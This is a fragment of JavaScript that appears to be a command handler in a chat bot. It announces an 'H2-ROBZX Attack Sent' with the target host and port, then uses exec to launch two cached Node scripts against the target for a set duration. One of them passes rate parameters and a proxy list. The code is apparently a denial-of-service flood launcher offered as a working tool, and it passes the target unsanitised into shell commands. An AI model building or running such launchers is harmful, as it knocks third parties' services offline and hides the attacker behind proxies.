...
╭━✧「 <b>H2-ROBZX Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const h2ca = path.join(__dirname, `../lib/cache/h2-robzx`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${h2ca} ${target} ${duration} 64 16 proxy.txt`);
  },
};